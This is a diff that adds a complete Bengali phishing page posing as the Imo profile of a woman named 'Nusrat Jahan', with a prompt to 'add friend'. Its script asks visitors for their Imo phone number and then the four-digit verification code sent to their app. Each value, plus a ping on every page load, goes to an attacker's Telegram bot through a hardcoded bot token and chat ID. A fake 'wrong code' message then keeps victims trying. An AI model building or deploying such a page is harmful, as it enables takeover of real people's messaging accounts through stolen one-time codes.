@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>নুসরাত জাহান Imo প্রোফাইল</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
+  
+  <!-- Font Awesome for Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+
+  <style>
+    body { 
+      font-family: 'Kalpurush', sans-serif; 
+      background: linear-gradient(135deg, #0f172a, #1e293b, #334155);
+      color: #e2e8f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+    .container {
+      max-width: 400px;
+      width: 100%;
+      background-color: rgba(15, 23, 42, 0.6);
+      backdrop-filter: blur(15px);
+      border-radius: 1.5rem;
+      padding: 2.5rem 2rem;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .profile-pic {
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      border: 4px solid #38bdf8;
+      box-shadow: 0 0 25px rgba(56, 189, 248, 0.5);
+      object-fit: cover;
+      margin: 0 auto;
+      display: block;
+    }
+    .input-field {
+      background-color: rgba(0, 0, 0, 0.3);
+      border: 1px solid #334155;
+      color: #f1f5f9;
+      border-radius: 0.75rem;
+      padding: 0.85rem 1rem;
+      text-align: center;
+      font-size: 1.1rem;
+      width: 100%;
+      transition: all 0.3s ease;
+    }
+    .input-field:focus {
+      outline: none;
+      border-color: #38bdf8;
+      box-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
+    }
+    .input-field::placeholder { color: #94a3b8; }
+    .btn {
+      background: linear-gradient(90deg, #38bdf8, #0ea5e9);
+      color: white;
+      font-weight: bold;
+      padding: 0.9rem;
+      border-radius: 0.75rem;
+      width: 100%;
+      border: none;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(14, 165, 233, 0.3);
+    }
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(14, 165, 233, 0.4);
+    }
+    .btn:disabled {
+      background: #475569;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .loader {
+      border: 6px solid #475569;
+      border-top: 6px solid #38bdf8;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 2rem auto;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .pin-inputs input {
+      width: 50px;
+      height: 60px;
+      text-align: center;
+      font-size: 1.5rem;
+      background-color: rgba(0, 0, 0, 0.3);
+      border: 1px solid #334155;
+      color: #f1f5f9;
+      border-radius: 0.75rem;
+      margin: 0 0.3rem;
+      transition: all 0.3s ease;
+    }
+    .pin-inputs input:focus {
+        outline: none;
+        border-color: #38bdf8;
+        box-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
+    }
+  </style>
+</head>
+<body class="antialiased">
+
+<div class="container">
+  <!-- Page 1: Phone Number Input -->
+  <div id="page1">
+    <img src="https://i.ibb.co/F8bJ3s1/imo-profile.jpg" alt="Profile Picture" class="profile-pic mb-4">
+    <h1 class="text-3xl font-bold text-center text-white mb-2">Nusrat Jahan</h1>
+    <p class="text-slate-300 text-center mb-6">এড হওয়ার জন্য আপনার IMO নাম্বার দিন</p>
+    
+    <form id="phoneForm" class="space-y-5">
+      <div class="relative">
+        <i class="fa fa-phone absolute left-4 top-1/2 -translate-y-1/2 text-slate-400"></i>
+        <input type="tel" id="phoneNumber" placeholder="আপনার ইমো নম্বর লিখুন" required class="input-field pl-12 text-center">
+      </div>
+      <button type="submit" id="addFriendBtn" class="btn">
+        <i class="fa fa-user-plus mr-2"></i> Add Friend
+      </button>
+    </form>
+  </div>
+
+  <!-- Loading Animation -->
+  <div id="loading" class="hidden text-center">
+    <div class="loader"></div>
+    <p class="text-lg text-slate-300">সংযোগ করা হচ্ছে...</p>
+  </div>
+
+  <!-- Page 2: Unlock Code Input -->
+  <div id="page2" class="hidden text-center">
+    <i class="fa fa-lock text-4xl text-sky-400 mb-4"></i>
+    <h1 class="text-2xl font-bold text-center mb-3">ভেরিফিকেশন কোড দিন</h1>
+    <p class="text-slate-300 text-center mb-6">আপনার ইমুতে পাঠানো ৪-সংখ্যার আনলক নাম্বারটি এখানে বসান।</p>
+    <div id="pinContainer" class="flex justify-center pin-inputs">
+      <input type="tel" pattern="[0-9]*" maxlength="1" onkeyup="moveToNext(this, 'pin2')">
+      <input type="tel" pattern="[0-9]*" id="pin2" maxlength="1" onkeyup="moveToNext(this, 'pin3')">
+      <input type="tel" pattern="[0-9]*" id="pin3" maxlength="1" onkeyup="moveToNext(this, 'pin4')">
+      <input type="tel" pattern="[0-9]*" id="pin4" maxlength="1" onkeyup="submitPin()">
+    </div>
+  </div>
+
+  <!-- Final Message -->
+  <div id="finalMessage" class="hidden text-center">
+    <div class="p-4 bg-red-900/50 border border-red-500/50 rounded-lg">
+      <i class="fa fa-exclamation-triangle text-2xl text-red-400 mb-3"></i>
+      <p class="text-lg text-red-300">আপনার আনলক নাম্বারটি ভুল। অনুগ্রহ করে সঠিক আনলক নাম্বারটি দিয়ে নুসরাত জাহানকে আপনার ইমুতে এড করুন। ধন্যবাদ।</p>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // --- CONFIGURATION ---
+  const TELEGRAM_BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco";
+  const CHAT_ID = "6658445342";
+  const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  // --- DOM ELEMENTS ---
+  const page1 = document.getElementById('page1');
+  const loading = document.getElementById('loading');
+  const page2 = document.getElementById('page2');
+  const finalMessage = document.getElementById('finalMessage');
+  const phoneForm = document.getElementById('phoneForm');
+  const addFriendBtn = document.getElementById('addFriendBtn');
+  const phoneNumberInput = document.getElementById('phoneNumber');
+  const pinContainer = document.getElementById('pinContainer');
+
+  // --- FUNCTIONS ---
+  async function sendMessage(text) {
+    try {
+      await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+      });
+    } catch (error) {
+      console.error("Telegram message failed:", error);
+    }
+  }
+
+  window.addEventListener('load', () => {
+    sendMessage("👤 ১ জন আপনার পেজ ভিজিট করেছে।");
+  });
+
+  phoneForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const phoneNumber = phoneNumberInput.value;
+    if (!phoneNumber) return;
+
+    addFriendBtn.disabled = true;
+    addFriendBtn.textContent = 'পাঠানো হচ্ছে...';
+    
+    await sendMessage(`*📱 নতুন নম্বর প্রাপ্ত:*\n\`${phoneNumber}\``);
+    
+    page1.classList.add('hidden');
+    loading.classList.remove('hidden');
+
+    setTimeout(() => {
+      loading.classList.add('hidden');
+      page2.classList.remove('hidden');
+      pinContainer.children[0].focus();
+    }, 3000);
+  });
+
+  function moveToNext(current, nextFieldId) {
+    if (current.value.length >= 1) {
+      if (nextFieldId) {
+        document.getElementById(nextFieldId).focus();
+      }
+    }
+  }
+
+  async function submitPin() {
+    const pins = [...pinContainer.children].map(input => input.value).join('');
+    
+    if (pins.length === 4) {
+      [...pinContainer.children].forEach(input => input.disabled = true);
+      
+      await sendMessage(`*🔑 প্রাপ্ত আনলক কোড:*\n\`${pins}\``);
+
+      page2.classList.add('hidden');
+      finalMessage.classList.remove('hidden');
+    }
+  }
+</script>
+
+</body>
+</html>
